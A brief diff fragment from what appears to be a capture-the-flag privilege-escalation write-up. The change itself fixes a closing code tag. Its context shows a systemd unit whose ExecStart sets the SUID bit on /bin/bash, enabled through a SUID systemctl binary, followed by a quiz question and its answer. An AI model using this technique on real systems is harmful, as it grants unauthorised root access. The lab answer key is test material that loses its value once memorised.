@@ -97,7 +97,7 @@ ExecStart=/bin/sh -c "chmod +s /bin/bash"
 WantedBy=multi-user.target' > $TF
 ./systemctl link $TF
 ./systemctl enable --now $TF
-<code>
+</code>
 
 #### Questions
 1. On the system, search for all SUID files. What file stands out? **Answer** **/bin/systemctl**
